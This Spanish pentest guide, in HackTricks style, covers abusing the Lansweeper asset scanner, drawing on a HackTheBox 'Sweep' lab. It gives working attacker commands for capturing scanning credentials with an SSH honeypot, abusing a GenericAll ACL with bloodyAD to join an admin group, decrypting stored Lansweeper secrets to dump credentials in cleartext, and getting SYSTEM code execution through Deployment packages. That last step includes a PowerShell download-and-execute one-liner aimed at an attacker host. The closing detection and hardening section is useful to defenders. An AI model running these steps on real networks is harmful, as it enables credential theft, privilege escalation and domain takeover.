# Abuse de Lansweeper: Credential Harvesting, descifrado de secretos y RCE mediante Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper es una plataforma de descubrimiento e inventario de activos de TI que suele implementarse en Windows e integrarse con Active Directory. Las credenciales configuradas en Lansweeper son utilizadas por sus motores de scanning para autenticarse en activos mediante protocolos como SSH, SMB/WMI y WinRM. Las configuraciones incorrectas permiten con frecuencia:

- Interceptar credenciales redirigiendo un objetivo de scanning a un host controlado por el atacante (honeypot)
- Abusar de las ACL de AD expuestas por grupos relacionados con Lansweeper para obtener acceso remoto
- Descifrar en el host los secretos configurados en Lansweeper (connection strings y credenciales de scanning almacenadas)
- Ejecutar código en endpoints administrados mediante la función Deployment (a menudo ejecutándose como SYSTEM)

Esta página resume workflows y comandos prácticos de atacante para abusar de estos comportamientos durante los engagements.

## 1) Obtener credenciales de scanning mediante un honeypot (ejemplo con SSH)

Idea: crear un Scanning Target que apunte a tu host y asignarle las Scanning Credentials existentes. Cuando se ejecute el scan, Lansweeper intentará autenticarse con esas credenciales y tu honeypot las capturará.<sup>[[1]](#references)</sup>

Resumen de los pasos (interfaz web):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (o Single IP) = tu IP de VPN
- Configurar el puerto SSH a uno accesible (por ejemplo, 2022 si el 22 está bloqueado)
- Desactivar la programación y planificar activarlo manualmente
- Scanning → Scanning Credentials → asegurarse de que existan credenciales de Linux/SSH; asignarlas al nuevo target (activar todas según sea necesario)
- Hacer clic en “Scan now” en el target
- Ejecutar un honeypot de SSH y recuperar el username/password intentado

Ejemplo con sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validar las credenciales capturadas contra los servicios del DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notas
- Funciona de forma similar con otros protocolos cuando puedes coaccionar al scanner para que se conecte a tu listener (honeypots de SMB/WinRM, etc.). SSH suele ser la opción más sencilla.
- Muchos scanners se identifican con banners de cliente distintivos (p. ej., RebexSSH) e intentan ejecutar comandos benignos (uname, whoami, etc.).

## 2) Abuso de ACL de AD: obtén acceso remoto agregándote a un grupo de administradores de una aplicación

Usa BloodHound para enumerar los derechos efectivos de la cuenta comprometida. Un hallazgo común es un grupo específico del scanner o de la aplicación (p. ej., “Lansweeper Discovery”) que tiene GenericAll sobre un grupo privilegiado (p. ej., “Lansweeper Admins”). Si el grupo privilegiado también es miembro de “Remote Management Users”, WinRM estará disponible en cuanto nos agreguemos.<sup>[[1]](#references)[[5]](#references)</sup>

Ejemplos de recopilación:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Explotar GenericAll en un grupo con BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Después, obtén una shell interactiva:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Consejo: las operaciones de Kerberos son sensibles al tiempo. Si encuentras KRB_AP_ERR_SKEW, sincroniza primero con el DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Descifrar secretos configurados por Lansweeper en el host

En el servidor de Lansweeper, el sitio ASP.NET normalmente almacena una cadena de conexión cifrada y una clave simétrica utilizada por la aplicación. Con el acceso local adecuado, puedes descifrar la cadena de conexión de la base de datos y, a continuación, extraer las credenciales de scanning almacenadas.<sup>[[1]](#references)</sup>

Ubicaciones habituales:
- Configuración web: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Clave de la aplicación: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Usa SharpLansweeperDecrypt para automatizar el descifrado y volcar las credenciales almacenadas:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Se espera que la salida incluya detalles de conexión a la DB y credenciales de escaneo en texto plano, como cuentas de Windows y Linux utilizadas en todo el entorno. Estas suelen tener derechos locales elevados en los hosts del dominio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Usa las creds recuperadas de Windows scanning para acceso privilegiado:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Como miembro de “Lansweeper Admins”, la interfaz web expone Deployment y Configuration. En Deployment → Deployment packages, puedes crear paquetes que ejecuten comandos arbitrarios en los activos objetivo. La ejecución la realiza el servicio de Lansweeper con altos privilegios, lo que permite la ejecución de código como NT AUTHORITY\SYSTEM en el host seleccionado.<sup>[[1]](#references)</sup>

Pasos generales:
- Crea un nuevo paquete de Deployment que ejecute un one-liner de PowerShell o cmd (reverse shell, add-user, etc.).
- Selecciona el activo deseado como objetivo (por ejemplo, el DC/host donde se ejecuta Lansweeper) y haz clic en Deploy/Run now.
- Recibe tu shell como SYSTEM.

Payloads de ejemplo (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Las acciones de deployment son ruidosas y dejan logs en Lansweeper y en los logs de eventos de Windows. Úsalas con prudencia.

## Detección y hardening

- Restringe o elimina las enumeraciones SMB anónimas. Monitoriza el RID cycling y el acceso anómalo a los recursos compartidos de Lansweeper.
- Controles de egress: bloquea o restringe estrictamente el SSH/SMB/WinRM saliente desde los hosts de escaneo. Genera alertas para puertos no estándar (por ejemplo, 2022) y banners de cliente inusuales, como Rebex.
- Protege `Website\\web.config` y `Key\\Encryption.txt`. Externaliza los secrets a un vault y rótalos si se produce un leak. Considera cuentas de servicio con privilegios mínimos y gMSA cuando sea viable.
- Monitorización de AD: genera alertas ante cambios en grupos relacionados con Lansweeper (por ejemplo, “Lansweeper Admins”, “Remote Management Users”) y ante cambios de ACL que otorguen membresía GenericAll/Write sobre grupos privilegiados.
- Audita la creación, modificación y ejecución de paquetes de Deployment; genera alertas para paquetes que ejecuten cmd.exe/powershell.exe o realicen conexiones salientes inesperadas.

## Temas relacionados
- Enumeración SMB/LSA/SAMR y RID cycling
- Password spraying de Kerberos y consideraciones sobre el clock skew
- Análisis de rutas de BloodHound para grupos de application-admin
- Uso de WinRM y movimiento lateral

## Referencias
- [1] [HTB: Sweep — Abusando del escaneo de Lansweeper, las ACL de AD y los secrets para tomar el control de un DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (honeypot de SSH)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
